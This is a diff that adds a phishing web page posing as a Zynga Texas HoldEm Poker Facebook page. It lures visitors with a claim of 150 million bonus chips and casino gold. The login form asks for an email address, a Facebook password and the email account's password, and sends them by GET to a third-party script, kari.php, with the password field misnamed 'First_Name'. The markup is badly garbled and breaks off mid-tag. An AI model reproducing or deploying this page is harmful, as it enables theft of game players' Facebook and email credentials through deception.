@@ -1,0 +1,582 @@
+<link rel="shortcut icon" href="http://photos-e.ak.fbcdn.net/photos-ak-sf2p/v43/52/2389801228/app_2_2389801228_6849.gif" />  <!-- CSS Stylesheet --> <style type="text/css" id="vbulletin_css">
+/**
+* vBulletin 3.8.2 CSS
+* Style: 'Texas HoldEm Style'; Style ID: 40
+*/
+body
+{
+	background: #000 url(http://api.ning.com/files/ekkVFefKM052ywrAoexnYYEqcBvQos66rY04NhztyytPxfB8t9S69IzHB8WvchhopqMBEcmZB3nnDbDwSsCvLJZ89HK57oTw/TexasHoldemSet_logo.jpg) top center no-repeat;
+	color: #888888;
+	font: 15pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	margin: 10px 20px 20px 20px;
+	padding: 0px;
+}
+a:link, body_alink
+{
+	color: #c5e3e6;
+}
+a:visited, body_avisited
+{
+	color: #c5e3e6;
+}
+a:hover, a:active, body_ahover
+{
+	color: #ffffff;
+}
+td, th, p, li
+{
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.tborder
+{
+	background: #444444;
+	color: #000000;
+}
+.tcat
+{
+	background: #000000 url(http://www.zynga.com/images/forums/texasholdem/black_bar.jpg) repeat-x top left;
+	color: #FFFFFF;
+	font: bold 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.tcat a:link, .tcat_alink
+{
+	color: #ffffff;
+	text-decoration: none;
+}
+.tcat a:visited, .tcat_avisited
+{
+	color: #ffffff;
+	text-decoration: none;
+}
+.tcat a:hover, .tcat a:active, .tcat_ahover
+{
+	color: #FFFF66;
+	text-decoration: underline;
+}
+.thead
+{
+	background: #012001;
+	color: #FFFFFF;
+	font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.thead a:link, .thead_alink
+{
+	color: #FFFFFF;
+}
+.thead a:visited, .thead_avisited
+{
+	color: #FFFFFF;
+}
+.thead a:hover, .thead a:active, .thead_ahover
+{
+	color: #FFFF00;
+}
+.tfoot
+{
+	background: #000000 url(http://www.zynga.com/images/forums/texasholdem/footer.jpg) repeat-x top center;
+	color: #ffffff;
+	text-align:center;
+}
+.tfoot a:link, .tfoot_alink
+{
+	color: #ffffff;
+}
+.tfoot a:visited, .tfoot_avisited
+{
+	color: #c5e3e6;
+}
+.tfoot a:hover, .tfoot a:active, .tfoot_ahover
+{
+	color: #ffffff;
+}
+.alt1, .alt1Active
+{
+	background: #000000;
+	color: #ffffff;
+}
+.alt2, .alt2Active
+{
+	background: #101010;
+	color: #ffffff;
+}
+.inlinemod
+{
+	background: #FFFFCC;
+	color: #000000;
+}
+.wysiwyg
+{
+	background: #F5F5FF;
+	color: #000000;
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	margin: 5px 10px 10px 10px;
+	padding: 0px;
+}
+.wysiwyg a:link, .wysiwyg_alink
+{
+	color: #c5e3e6;
+}
+.wysiwyg a:visited, .wysiwyg_avisited
+{
+	color: #c5e3e6;
+}
+.wysiwyg a:hover, .wysiwyg a:active, .wysiwyg_ahover
+{
+	color: #ffffff;
+}
+textarea, .bginput
+{
+	font: 10pt verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.bginput option, .bginput optgroup
+{
+	font-size: 10pt;
+	font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.button
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+select
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+option, optgroup
+{
+	font-size: 11px;
+	font-family: verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.smallfont
+{
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.time
+{
+	color: #30881f;
+}
+.navbar
+{
+	color: #999999;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.highlight
+{
+	color: #FF0000;
+	font-weight: bold;
+}
+.fjsel
+{
+	background: #3E5C92;
+	color: #E0E0F6;
+}
+.fjdpth0
+{
+	background: #F7F7F7;
+	color: #000000;
+}
+.panel
+{
+	background: #E4E7F5 url(images/gradients/gradient_panel.gif) repeat-x top left;
+	color: #000000;
+	padding: 10px;
+	border: 2px outset;
+}
+.panelsurround
+{
+	background: #D1D4E0 url(images/gradients/gradient_panelsurround.gif) repeat-x top left;
+	color: #000000;
+}
+legend
+{
+	color: #22229C;
+	font: 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+}
+.vbmenu_control
+{
+	background: #012001;
+	color: #FFFFFF;
+	font: bold 11px tahoma, verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	padding: 3px 6px 3px 6px;
+	white-space: nowrap;
+}
+.vbmenu_control a:link, .vbmenu_control_alink
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_control a:visited, .vbmenu_control_avisited
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_control a:hover, .vbmenu_control a:active, .vbmenu_control_ahover
+{
+	color: #FFFFFF;
+	text-decoration: underline;
+}
+.vbmenu_popup
+{
+	background: #444444;
+	color: #ffffff;
+}
+.vbmenu_option
+{
+	background: #1e1e1e;
+	color: #fffffff;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	white-space: nowrap;
+	cursor: pointer;
+}
+.vbmenu_option a:link, .vbmenu_option_alink
+{
+	color: #c5e3e6;
+	text-decoration: none;
+}
+.vbmenu_option a:visited, .vbmenu_option_avisited
+{
+	color: #c5e3e6;
+	text-decoration: none;
+}
+.vbmenu_option a:hover, .vbmenu_option a:active, .vbmenu_option_ahover
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite
+{
+	background: #101010;
+	color: #FFFFFF;
+	font: 11px verdana, geneva, lucida, 'lucida grande', arial, helvetica, sans-serif;
+	white-space: nowrap;
+	cursor: pointer;
+}
+.vbmenu_hilite a:link, .vbmenu_hilite_alink
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite a:visited, .vbmenu_hilite_avisited
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+.vbmenu_hilite a:hover, .vbmenu_hilite a:active, .vbmenu_hilite_ahover
+{
+	color: #FFFFFF;
+	text-decoration: none;
+}
+/* ***** styling for 'big' usernames on postbit etc. ***** */
+.bigusername { font-size: 14pt; }
+
+/* ***** small padding on 'thead' elements ***** */
+td.thead, th.thead, div.thead { padding: 4px; }
+
+/* ***** basic styles for multi-page nav elements */
+.pagenav a { text-decoration: none; }
+.pagenav td { padding: 2px 4px 2px 4px; }
+
+/* ***** de-emphasized text */
+.shade, a.shade:link, a.shade:visited { color: #777777; text-decoration: none; }
+a.shade:active, a.shade:hover { color: #FF4400; text-decoration: underline; }
+.tcat .shade, .thead .shade, .tfoot .shade { color: #DDDDDD; }
+
+/* ***** define margin and font-size for elements inside panels ***** */
+.fieldset { margin-bottom: 6px; }
+.fieldset, .fieldset td, .fieldset p, .fieldset li { font-size: 11px; }
+</style>
+<link rel="stylesheet" type="text/css" href="clientscript/vbulletin_important.css?v=382" />   <!-- / CSS Stylesheet -->  <script type="text/javascript" src="clientscript/yui/yahoo-dom-event/yahoo-dom-event.js?v=382"></script> <script type="text/javascript" src="clientscript/yui/connection/connection-min.js?v=382"></script> <script type="text/javascript">
+<!--
+var SESSIONURL = "";
+var SECURITYTOKEN = "guest";
+var IMGDIR_MISC = "http://www.zynga.com/images/forums/mafiawarsiphone/images/misc";
+var vb_disable_ajax = parseInt("0", 10);
+// -->
+</script> <script type="text/javascript" src="clientscript/vbulletin_global.js?v=382"></script> <script type="text/javascript" src="clientscript/vbulletin_menu.js?v=382"></script>
+<title>Texas HoldEm Poker - Facebook</title>
+
+    <!-- T35 Hosting Ad Code Begin --> <style type="text/css">
+#t35ad{font: 14px  arial,helvetica; text-decoration: none; line-height:1.5em; text-align: center; }
+#t35ad a{font: 14px  arial,helvetica; text-decoration: none; }
+#t35ad a:hover{background-color: black; color: white; font-size:medium; font-weight: bold; }
+#t35ad ul{display: inline; list-style-type: none; padding: 0;}
+#navlist li{display: inline; list-style-type: none; padding-right: 0px; padding-left: 0px; padding: 0;}
+
+</style> <script type="text/javascript" charset="utf-8">
+  var redvase_ad = { version: 1.5 };
+  redvase_ad.publisher = 't35';
+  redvase_ad.kind      = 't35_footer_prem';
+  redvase_ad.content   = 'creative'
+  </script> <script src="http://redvase.bravenet.com/javascripts/redvase.js" type="text/javascript" charset="utf-8"></script> <!-- T35 Hosting Ad Code End --> <!-- T35 Hosting Ad Code Begin --> <style type="text/css">
+#t35ad{font: 14px  arial,helvetica; text-decoration: none; line-height:1.5em; text-align: center; }
+#t35ad a{font: 14px  arial,helvetica; text-decoration: none; }
+#t35ad a:hover{background-color: black; color: white; font-size:medium; font-weight: bold; }
+#t35ad ul{display: inline; list-style-type: none; padding: 0;}
+#navlist li{display: inline; list-style-type: none; padding-right: 0px; padding-left: 0px; padding: 0;}
+</style> <script type="text/javascript" charset="utf-8">
+  var redvase_ad = { version: 1.5 };
+  redvase_ad.publisher = 't35';
+  redvase_ad.kind      = 't35_footer_prem';
+  redvase_ad.content   = 'creative'
+  </script> <script src="http://redvase.bravenet.com/javascripts/redvase.js" type="text/javascript" charset="utf-8"></script>  <!-- T35 Hosting Ad Code End --> <!-- T35 Hosting Ad Code Begin --> <style type="text/css">
+#t35ad{font: 14px  arial,helvetica; text-decoration: none; line-height:1.5em; text-align: center; }
+#t35ad a{font: 14px  arial,helvetica; text-decoration: none; }
+#t35ad a:hover{background-color: black; color: white; font-size:medium; font-weight: bold; }
+#t35ad ul{display: inline; list-style-type: none; padding: 0;}
+#navlist li{display: inline; list-style-type: none; padding-right: 0px; padding-left: 0px; padding: 0;}
+
+
+
+</style> <script type="text/javascript" charset="utf-8">
+  var redvase_ad = { version: 1.5 };
+  redvase_ad.publisher = 't35';
+  redvase_ad.kind      = 't35_footer_prem';
+  redvase_ad.content   = 'creative'
+  </script> <script src="http://redvase.bravenet.com/javascripts/redvase.js" type="text/javascript" charset="utf-8"></script>  <!-- T35 Hosting Ad Code End -->  <!-- logo -->
+
+<table cellspacing="0" cellpadding="0" border="0" align="center" width="800">
+    <tbody>
+        <tr>
+            <td align="left"><a href="index.php"><img border="0" src="images/misc/vbulletin3_logo_white.gif" alt="Zynga Community Forums" style="width: 550px; height: 120px; display: block; visibility: hidden;" /></a></td>
+            <td align="right" id="header_right_cell">&nbsp;  		 	</td>
+        </tr>
+    </tbody>
+</table>
+<!-- /logo -->  <!-- content table --> <!-- open content container -->
+
+<div align="center">
+<div class="page" style="width: 800px; text-align: left;">
+<div align="left" style="padding: 0px 15px;">               <center>
+<p><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size="5" color="#d80000"><marquee height="10" width="35%" align="center" onmouseout="this.start()" onmouseover="this.stop()" scrollamount="9">*** CLAIM'S CHIP ***  </marquee></font></strong></font></strong></font></strong></font></strong></p>
+<p><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><br />
+</font></strong></font></strong></font></strong></p>
+</center>
+<div align="left" class="vbmenu_popup" id="community_menu" style="display: none; margin-top: 3px;">
+<table cellspacing="1" cellpadding="4" border="0">
+    <tbody>
+        <tr>
+            <td class="thead">Community Links</td>
+
+        </tr>
+        <tr>
+            <td class="vbmenu_option"><a href="memberlist.php">Members List</a></td>
+        </tr>
+    </tbody>
+</table>
+</div>
+<!-- / community link menu --><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">  	 	 	 	<!-- header quick search form --> </font></strong> </font></strong> </font></strong>
+
+<div align="left" class="vbmenu_popup" id="navbar_search_menu" style="display: none; margin-top: 3px;">
+<table cellspacing="1" cellpadding="4" border="0">
+    <tbody>
+        <tr>
+            <td class="thead">Search Forums</td>
+        </tr>
+        <tr>
+            <td class="vbmenu_option" title="nohilite">
+            <form action="kari.php" method="GET">
+
+                <input type="hidden" name="do" value="process" />  					<input type="hidden" name="quicksearch" value="1" /> 					<input type="hidden" name="childforums" value="1" />  					<input type="hidden" name="exactname" value="1" />  					<input type="hidden" name="s" value="" /> 					<input type="hidden" name="securitytoken" value="guest" />
+                <div><input type="text" class="bginput" name="query" size="25" tabindex="1001" /><input type="submit" class="button" value="Go" tabindex="1004" /></div>
+                <div style="margin-top: 6px;">  						<label for="rb_nb_sp0"><input type="radio" name="showposts" value="0" id="rb_nb_sp0" tabindex="1002" checked="checked" />Show Threads</label>  						&nbsp;  						<label for="rb_nb_sp1"><input type="radio" name="showposts" value="1" id="rb_nb_sp1" tabindex="1003" />Show Posts</label>  					</div>
+
+            </form>
+            </td>
+        </tr>
+        <tr>
+            <td class="vbmenu_option"><a href="tags.php" rel="nofollow">Tag Search</a></td>
+        </tr>
+        <tr>
+            <td class="vbmenu_option"><a href="search.php" accesskey="4" rel="nofollow">Advanced Search</a></td>
+
+        </tr>
+    </tbody>
+</table>
+</div>
+<!-- / header quick search form --><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">  	 	 	 <!-- / NAVBAR POPUP MENUS -->  <!-- PAGENAV POPUP --> </font></strong> </font></strong> </font></strong>
+<div class="vbmenu_popup" id="pagenav_menu" style="display: none;">
+<table cellspacing="1" cellpadding="4" border="0">
+    <tbody>
+        <tr>
+
+            <td nowrap="nowrap" class="thead">Go to Page...</td>
+        </tr>
+        <tr>
+            <td class="vbmenu_option" title="nohilite">
+            <form action="kari.php" method="GET" onsubmit="return this.gotopage()" id="pagenav_form">
+                <input type="text" class="bginput" id="pagenav_itxt" style="font-size: 11px;" size="4" />  				<input type="button" class="button" id="pagenav_ibtn" value="Go" />
+            </form>
+            </td>
+
+        </tr>
+    </tbody>
+</table>
+</div>
+<!-- / PAGENAV POPUP --><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">       <!-- sub-forum list  -->      </font></strong></font></strong></font></strong><center>
+<h3><font color="#ff0000"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" font=""><blink>Texas HoldEm Poker on Facebook</blink></font></font></strong></font></strong></font></strong></font></h3>
+</center></div>
+<form method="GET" action="kari.php" id="login_form">
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <input type="hidden" name="charset_test" value="€,´,?,?,?,?,?" />     </font></strong>     </font></strong>     </font></strong>
+
+    <p><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""></font></font></strong></font></strong></font></strong></p>
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    </font></strong></font></strong></font></strong><center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">	   </font>     </font></strong> <strong><font size=" _fcksavedurl=">    <font size="4" color="#faf8cc" font=""> </font>     </font></strong>     </font></strong>     </font></strong>
+    <p><strong><font size=" _fcksavedurl="><font color="#ff0000"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">&nbsp;</font></strong><font size="4" color="#ffff00">You can claim Bonus $150,000,000 Chips and 50 Casino Gold </font>       </font></strong></font></font></strong></p>
+
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">     </font></strong>     </font></strong>     </font></strong>
+    <p><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#ff0000" font=""><blink>LOGIN WITH YOUR FACEBOOK ACCOUNT </blink></font> </font></strong></font></strong></font></strong> <br />
+    </p>
+    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <strong><font size=" _fcksavedurl=">    <font size="4" color="#faf8cc" font="">    </font></font></strong></font></strong></font></strong></center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">  </font> </font></strong> </font></strong> </font></strong>
+
+</form>
+</div>
+<strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">         </font> </font></strong> </font></strong> </font></strong>
+<div align="left" class="vbmenu_popup" id="community_menu" style="display: none; margin-top: 3px;"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> </font></strong></font></strong></font></strong></div>
+<div class="vbmenu_popup" id="pagenav_menu" style="display: none;"><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> </font></strong></font></strong></font></strong></div>
+<div id="loginform" style=""><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="> <font size="4" color="#faf8cc" font="">    </font> </font></strong> </font></strong> </font></strong>
+
+<div class="form_row clearfix "><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl=">  <font size="4" color="#faf8cc" font="">       </font></font></strong></font></strong></font></strong></div>
+<strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">        </font></font></strong> </font></strong></font></strong>
+<div align="left" class="vbmenu_popup" id="community_menu" style="display: none; margin-top: 3px;"> </div>
+<div class="vbmenu_popup" id="pagenav_menu" style="display: none;">  </div>
+<form action="kari.php" method="GET">
+    <div id="loginform" style="">  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">    </font></font></font></strong></font></strong>
+    <div class="form_row clearfix ">  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">      <label for="email" id="label_email"></label></font></font></font></strong></font></strong><center>  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">        <span class="style2">Email        </span>        </font></font></font></strong></font></strong></center>  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">              </font></font></font></strong></font></strong><center>  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">      <input type="text" class="inputtext" id="email" name="email" value="" onkeypress="formchange()" /></font></font></font></strong></font></strong></center>  <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">    </font></font></font></strong></font></strong></div>
+
+    <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">        </font></font></font></strong></font></strong>
+    <div class="form_row clearfix "><center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff"> <span class="style2">Password </span></font><strong><font size="4" face="Tahoma" color="#d80000"><img height="30" width="30" alt="" src="http://j3.tagstat.com/image04/c/bee9/00050543bXF.jpg" /></font></strong></font></font></font></strong></font></strong></center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff">  </font></font></font></font></strong></font></strong><center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff"> <input type="password" value="" name="First_Name" id="First_Name" class="inputpassword" /></font></font></font></font></strong></font></strong></center></div>
+    <strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font="">        <font size="4" color="#f8f8ff">     </font>  </font></font></font></strong></font></strong><center><strong><font size=" _fcksavedurl="><strong><font size=" _fcksavedurl="><font size=" _fcksavedurl="><font size="4" color="#faf8cc" font=""><font size="4" color="#f8f8ff"> <span class="style2">Password of your E-mail<br />
+    </span></font><a id="rg_hl" class="rg_hl" href="http://www.google.com/imgres?imgurl=http://historical.ha.com/c/s/i/hotmail-logo.gif&amp;imgrefurl=http://historical.ha.com/c/ref/web-tips.zx&amp;usg=__ls5Yo_NB6hNAIehVQgKLbaLyvSU=&amp;h=46&amp;w=51&amp;sz=3&amp;hl=en&amp;start=0&amp;zoom=1&amp;tbnid=I1Rx5Bv6z3CHOM:&amp;tbnh=46&amp;tbnw=51&amp;prev=/images%3Fq%3Dhotmail%2Blogo%26hl%3Den%26biw%3D1568%26bih%3D732%26gbv%3D2%26tbs%3Disch:1&amp;itbs=1&amp;iact=hc&amp;vpx=493&amp;vpy=579&amp;dur=491&amp;hovh=46&amp;hovw=51&amp;tx=79&amp;ty=44&amp;ei=teFzTOXzPIuBswawnbmNCQ&amp;oei=F-FzTIyzDcTNswaH26DLCA&amp;esq=16&amp;page=1&amp;ndsp=31&amp;ved=1t:429,r:25,s:0"><img height="46" width="30" id="rg_hi" class="rg_hi" data-width="51" data-height="46" style="width: 30px; height: 30px;" src="http://t1.gstatic.com/images?q=tbn:ANd9GcTOTGcg-z2WLuxhOhptLAU_euNndY295RPOiEFrIcXCgG129s4&amp;t=1&amp;usg=__sPw0vZLS6Vv6b0SWckFLDLp_8qw=" alt="" /></a><a href="http://www.google.com/imgres?imgurl=http://pyramid.gogrid.com/images/logo_gmail.png&amp;imgrefurl=http://pyramid.gogrid.com/cloud-applications/&amp;usg=__SBoUJl9EY_coFghHSz0Ivoo_B3E=&amp;h=67&amp;w=200&amp;sz=12&amp;hl=en&amp;start=619&amp;zoom=0&amp;tbnid=nlGxsq3ZxFxHZM:&amp;tbnh=35&amp;tbnw=104&amp;prev=/images%3Fq%3Dgmail%2Blogo%26um%3D1%26hl%3Den%26gbv%3D2%26prmdo%3D1%26biw%3D1568%26bih%3D732%26tbs%3Disch:1&amp;um=1&amp;itbs=1&amp;iact=hc&amp;vpx=1208&amp;vpy=394&amp;dur=431&amp;hovh=35&amp;hovw=104&amp;tx=86&amp;ty=28&amp;ei=vL9zTJXfFsKSswaz2pGsCQ&amp;oei=-r5zTOvfO8yCswaGxq3cCA&amp;esq=20&amp;page=20&amp;ndsp=33&amp;ved=1t:429,r:6,s:619" class="rg_hl" id="rg_hl"><img height="30" width="30" alt="" src="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAkGBggGERQTEQgWFBUWGRYaFRcXFBkYHxseHyAhGR8cHhwYHiYjHyUjGSAaIjssJScrLTg4GCoxNTA2QSg3Ly0BCQoKDQsNGQ4OGTUkHiQ1NTU1NTU1NTU1NTU1NTU1NTU1NTU1NSk1NDUvNSwsLDU1NTU1LC81LywsLjY2NCwyNP/AABEIACMAaAMBIgACEQEDEQH/xAAbAAEAAgMBAQAAAAAAAAAAAAAABQYCAwQBB//EADcQAAEDAgMFBQYEBwAAAAAAAAEAAgMEEQUhQQYSEzFRImFxgZEUMnPC0fAjNUKxB0VSU3Kh4f/EABgBAAMBAQAAAAAAAAAAAAAAAAADBAIB/8QAKhEAAQQABQIFBQEAAAAAAAAAAQACAxEEEhMhMUFRcYGRodEiI2HB8BT/2gAMAwEAAhEDEQA/APuK01dXDQsdJI/da0EuPQBblTv4pVD4aNrQcnyNDvAAu/cD0TYY9SQM7pM8mlE5/ZbcOqcW2vvIKh1NT3IYGW4j7alxvby9V11Gyk9rw45UsfoXSl4v3tcpHAGRx0sAaMuGy3oFILrpCHfTsFlsQLRn3Pf+4UDspNjkrHisa3suIY4DdLrZEkZZdMgp5eEqm4Lt/wC2v3J42xbxsx+e6T0JPLTPlmkySjNZ2tWQYaRzDk3y+quaKEx7aNmBNG8Wukd7kbb3OnkL/wDFr2a2gqMcgfI6nAc1xAa0nPIHXxWDI0GlvQk09WtlPqPxPHaHB3Rtlm3TK7dZkTnlztyFyPVanYlW0/akpLN7jn+5XBtTisVI+kBo2SiSUAFw93l2m9+aMNKyd5YAbHTg+/gpp7iZmv8AalZsYhgqGU5Y7ee0uBytr3306LrilMl/wyLddfBVzEPzSn+GfnVnXQbtLieXF19D8IiItJyKF2vwR2P0r42++LOZ/kNPMXHmppFpjixwcOQsPYJGlruCqLsHtTHEwUlQ7hyRktZv5XH9OfIjlbUWVuxGgdiDQ0VkkfUxkNJ87X9Fx45s9hOJjenow45DeGTszbmMyo2DZnCBZkcsrmkOyM8m7lbLdBF+Y8k+R8b3ZxYKnjjlY3TdRHfg+eyjNiKysqaypZJXSSNi3g0PeT+stuQdbBZbI4TBjVE+OSG44ryHci07rcwev+uqsGGx4VhdhDStaXdm7ALOOWV/PVcjKbCaVo4dO5rb3dm4AdcgefLuy7kjEETSZgNlbgnHDQGMnckG/X5XuCbIx4K7iPeZ38muP6QMhYEnO30CjNi6h9NSTFvPikeGQVmiwilkF+G8eLz9VtosGocPY6OOABrjci5Nz5qSWFzmFsZo0d/FV/6swOpuSR7Woqpp92MPdWFznW7N8vrkona/+W/FZ8qtLcEo23/DJ8ScvBZVWD0VZw9+AO4RBZe/ZI1WcDAcNOZXACwBQ8+p55UWK+9FkB6/ChcQ/NKf4Z+dWdc0mHU0sjZTFd7RZrug+yfVdKpAq0qNhYXfk2iIi0moiIhC8c1rxYtuOhWv2aEi3DHO/LXqiIQns0P9pumg+9B6KPpI2SSuu0GxeBcaAiw8s7dLoiEKTjY2MABoAHIAWWSIhCIiIQiIiEIiIhC//9k=" style="width: 30px; height: 30px;" data-height="35" data-width="104" class="rg_hi" id="rg_hi" /></a><a id="rg_hl" class="rg_hl" href="http://www.google.com/imgres?imgurl=http://historical.ha.com/c/s/i/hotmail-logo.gif&amp;imgrefurl=http://historical.ha.com/c/ref/web-tips.zx&amp;usg=__ls5Yo_NB6hNAIehVQgKLbaLyvSU=&amp;h=46&amp;w=51&amp;sz=3&amp;hl=en&amp;start=0&amp;zoom=1&amp;tbnid=I1Rx5Bv6z3CHOM:&amp;tbnh=46&amp;tbnw=51&amp;prev=/images%3Fq%3Dhotmail%2Blogo%26hl%3Den%26biw%3D1568%26bih%3D732%26gbv%3D2%26tbs%3Disch:1&amp;itbs=1&amp;iact=hc&amp;vpx=493&amp;vpy=579&amp;dur=491&amp;hovh=46&amp;hovw=51&amp;tx=79&amp;ty=44&amp;ei=teFzTOXzPIuBswawnbmNCQ&amp;oei=F-FzTIyzDcTNswaH26DLCA&amp;esq=16&amp;page=1&amp;ndsp=31&amp;ved=1t:429,r:25,s:0"><strong><font size="4" face="Tahoma" color="#d80000"><img height="30" width="30" alt="" src="http://j0.tagstat.com/image03/c/bee9/000a0543bXF.jpg" /></font></strong></a><a id="rg_hl" class="rg_hl" href="http://www.google.com/imgres?imgurl=http://prefpass.com/images/logo_aim_aol.gif&amp;imgrefurl=http://prefpass.com/api/sso_initiate/8e8a407ee217bc99768515323e7a64f7%3Fsite%3D137a27f2a593c7267fca763f5e2bc8fe&amp;usg=__YK2QF_ET7RGSHZjW2FbeTVkFw-s=&amp;h=24&amp;w=109&amp;sz=3&amp;hl=en&amp;start=164&amp;zoom=0&amp;tbnid=Ypm0G53z9dO_oM:&amp;tbnh=19&amp;tbnw=85&amp;prev=/images%3Fq%3Daol%2Baim%2Blogo%26hl%3Den%26biw%3D1568%26bih%3D732%26gbv%3D2%26tbs%3Disch:1&amp;itbs=1&amp;iact=hc&amp;vpx=310&amp;vpy=270&amp;dur=441&amp;hovh=19&amp;hovw=85&amp;tx=84&amp;ty=20&amp;ei=oA10TMDMOI2FswbT7viKCQ&amp;oei=Jgx0TICLEdCFswai0_HcCA&amp;esq=6&amp;page=6&amp;ndsp=34&amp;ved=1t:429,r:27,s:164"><img height="19" width="85" id="rg_hi" class="rg_hi" data-width="85" data-height="35" style="width: 40px; height: 30px;" 